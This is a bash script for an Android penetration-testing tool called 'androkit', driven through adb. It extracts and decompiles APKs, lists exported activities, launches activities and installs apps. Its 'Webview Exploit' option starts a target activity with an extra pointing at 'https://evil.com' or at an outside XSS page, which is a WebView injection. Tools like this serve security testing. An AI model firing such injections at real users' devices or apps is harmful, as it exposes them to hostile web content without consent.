#!/bin/bash

# Function to determine the operating system
function detect_os() {
    if [[ "$OSTYPE" == "linux-gnu"* ]]; then
        echo "linux"
    elif [[ "$OSTYPE" == "darwin"* ]]; then
        echo "mac"
    else
        echo "unknown"
    fi
}

# Function to check if the script is executed with root privileges
function check_root() {
    if [ "$(id -u)" -ne 0 ]; then
        echo -e "\033[0;31mThis script requires root privileges for installation."
        exit 1
    fi
}

# Install the script to appropriate location based on OS
function install_script() {
    os=$(detect_os)
    if [ "$os" == "mac" ]; then
        rm -rf /usr/local/bin/androkit
        cp "$0" /usr/local/bin/androkit
        chmod +x /usr/local/bin/androkit
    elif [ "$os" == "linux" ]; then
        rm -rf /bin/androkit
        cp "$0" /bin/androkit
        chmod +x /bin/androkit
    else
        echo -e "\033[0;31mUnsupported operating system."
        exit 1
    fi
}

# Check if --install option is provided
if [ "$1" == "--install" ]; then
    check_root
    install_script
    echo -e "\033[0;32mScript installed successfully."
    echo "run: androkit"
    exit 0
fi

# Connect to your android
if [ $# -eq 1 ]; then
    if [[ $1 =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+:[0-9]+$ ]]; then
        adb connect "$1"
        exit 0
    else
        echo "Invalid IP:PORT format. Usage: $0 <IP>:<PORT>"
        exit 1
    fi
fi

# Check if an Android device is connected using ADB
device_status=$(adb get-state)
if [ "$device_status" != "device" ]; then
    echo "Connect to your android device"
    echo "Usage: $0 <IP>:<PORT>"
    exit 1
fi



# Containers
model=$(adb shell getprop ro.product.model)
path="/Users/mdnahidalam/Desktop/android_security/target/" # Set your path

#BANNER
function banner(){
    clear
    echo -e "\033[0;32m"
    echo "⣿⣿⣿⣿⣿⣿⣧⠻⣿⣿⠿⠿⠿⢿⣿⠟⣼⣿⣿⣿⣿⣿⣿ v1.5"
    echo "⣿⣿⣿⣿⣿⣿⠟⠃⠁⠀⠀⠀⠀⠀⠀⠘⠻⣿⣿⣿⣿⣿⣿"
    echo "⣿⣿⣿⣿⡿⠃⠀⣴⡄⠀⠀⠀⠀⠀⣴⡆⠀⠘⢿⣿⣿⣿⣿"
    echo "⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿"
    echo "⣿⠿⢿⣿⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⠶⣿⡿⠿⣿  @nahid0x1"
    echo "⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢸"
    echo "⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢸"
    echo "⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢸"
    echo "⡇⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠀⠀⢸"
    echo "⣧⣤⣤⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣤⣤⣼"
    echo "⣿⣿⣿⣿⣶⣤⡄⠀⠀⠀⣤⣤⣤⠀⠀⠀⢠⣤⣴⣿⣿⣿⣿"
    echo "⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⣿⣿⣿⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿"
    echo "⣿⣿⣿⣿⣿⣿⣿⣤⣤⣴⣿⣿⣿⣦⣤⣤⣾⣿⣿⣿⣿⣿⣿"
    echo -e "\n\033[0;32mSelected Android [\033[0;37m$model\033[0;32m]\n"
}

# Main Menu
function menu(){
    banner
    echo -e "\033[0;37m01. \033[0;32mAll Packages Names"
    echo -e "\033[0;37m02. \033[0;32mShow Installed App Packages"
    echo -e "\033[0;37m03. \033[0;32mExtract APK"
    echo -e "\033[0;37m04. \033[0;32mDecompile APK [JADX]"
    echo -e "\033[0;37m05. \033[0;32mDecompile APK [Apktool]"
    echo -e "\033[0;37m06. \033[0;32mRun Activity"
    echo -e "\033[0;37m07. \033[0;32mShow Exploitable Activity"
    echo -e "\033[0;37m08. \033[0;32mWebview Exploit"
    echo -e "\033[0;37m09. \033[0;32mInstall APK To Android"
    echo -e "\n\033[0;37m(connect)      (disconnect)"
    echo -e "\033[0;37m(devices)      (root)"
    echo -e "\n\033[0;33mInstall requirement for:"
    echo -e "$> Mac"
    echo "$> Linux"
    echo -e "\033[0;32m"
    read -p "[$model] Console> " input
}

# Run function
while true; do
    menu

##################################################################
    # Show all the package names
    if [ "$input" == "1" ]; then
        banner
        adb shell pm list packages
        echo -e "\n"
        read -p "Press ENTER to Clear" enter

    # Show installed app packages
    elif [ "$input" == "2" ]; then
        banner
        packages=$(adb shell pm list packages -3 | cut -d':' -f2)
        echo -e "Installed Apps:"
        echo -e "$packages"
        echo " "
        read -p "Press ENTER to Clear" enter

    # Extract APK
    elif [ "$input" == "3" ]; then
        banner
        read -p "[$model] Package name> " package_name
        folder_list=$(ls "$path")
        echo -e "\nSelect your folder:\n"
        echo -e "$folder_list\n"
        read -p "[$model] path name> " extract_apk_folder
        extract=$(adb shell pm path "$package_name" | sed 's/package://g')
        mkdir -p "$path/$extract_apk_folder/$package_name"
        adb pull "$extract" "$path$extract_apk_folder/$package_name"
        banner
        echo -e "saved: $path/$extract_apk_folder/$package_name/base.apk"
        read -p "Press ENTER to Clear" enter

    # Decompile APK [JADX]
    elif [ "$input" == "4" ]; then
        banner
        read -p "[$model] APK file> " apkfile
        read -p "[$model] Decompile path> " folder_path
        mkdir -p "$folder_path/jadx"
        banner
        jadx -d "$folder_path/jadx" "$apkfile"
        echo -e "\ndecompiled: $folder_path"
        read -p "Press ENTER to Clear" enter

    # Decompile APK [Apktool]
    elif [ "$input" == "5" ]; then
        banner
        read -p "[$model] APK file> " apkfile
        decompile_path=$(echo -e "$apkfile.decompile" | sed 's/.apk//g')
        banner
        apktool d -o "$decompile_path" "$apkfile"
        show=$(echo -e "\ndecompiled: $decompile_path")
        echo "$show"
        read -p "Press ENTER to Clear" enter

    # Activity run
    elif [ "$input" == "6" ]; then
        banner
        read -p "[$model] activity name> " run_activity
        adb shell am start -n "$run_activity"

    # Exploitable activity
    elif [ "$input" == "7" ]; then
        banner
        read -p "[$model] Path> " search_dir
        echo -e " "
        grep_result=$(grep -R 'exported="true"' "$search_dir")
        while IFS= read -r line; do
            activity=$(echo "$line" | grep -o 'android:name="[^\"]*' | sed 's/android:name="//')
            if [ ! -z "$activity" ]; then
                echo -e "\033[0;32mActivity name: \033[0;35m$activity \033[0;31m[True]"
            fi
        done <<< "$grep_result"
        echo -e " "
        read -p "Press ENTER to Clear" enter
  
  # webview exploit
    elif [ "$input" == "8" ]; then
        banner
        read -p "[$model] activity name> " activity_name
        read -p "[$model] string name> " string
        echo -e "Choice: 1) evil.com   2) XSS"
        read -p "[$model] website option> " website_option

        if [ "$website_option" == "1" ]; then
            website="https://evil.com"
        elif [ "$website_option" == "2" ]; then
            website="https://nahid0x1.github.io/xss.html"
        else
            echo "Wrong Option"
        fi
        adb shell am start -n "$activity_name" --es "$string" "$website"
        echo -e " "
        read -p "Press ENTER to Clear" enter
    
    # install apk to android
    elif [ "$input" == "9" ]; then
        banner
        read -p "[$model] APK file> " apk
        banner
        adb install $apk
        echo "App Installed"
        read -p "Press ENTER to Clear" enter



###############Script Function######################
    # Connect
    elif [[ "$input" == connect* ]]; then
        ip_port=$(echo "$input" | cut -d' ' -f2)
        banner
        adb connect "$ip_port"
        echo -e " "
        read -p "Press ENTER to Clear" enter

    # Disconnect
    elif [[ "$input" == disconnect* ]]; then
        ip_port=$(echo "$input" | cut -d' ' -f2)
        banner
        adb disconnect "$ip_port"
        echo -e " "
        read -p "Press ENTER to Clear" enter

    elif [ "$input" == "linux" ]; then
        sudo apt install -y python3 openjdk apktool jadx adb
        pip3 install frida-tools
        pip3 install objection
    elif [ "$input" == "mac" ]; then
        brew install apktool
        brew install jadx
        brew install android-platform-tools
        brew install openjdk
        pip3 install frida-tools
        pip3 install objection

    # show devices
    elif [[ "$input" == devices* ]]; then
        banner
        echo -e "\033[0;33m\n"
        adb devices
        echo -e "\033[0;32m\n"
        read -p "Press ENTER to Clear" enter

    # android root check
   elif [[ "$input" == root* ]]; then
        banner
        echo -e "\033[0;33m"
        adb root
        echo -e "\033[0;32m\n"
        read -p "Press ENTER to Clear" enter

    # Wrong input
    else
        echo -e "\nWrong Option"
        read -p "Press ENTER to Clear" enter
    fi
done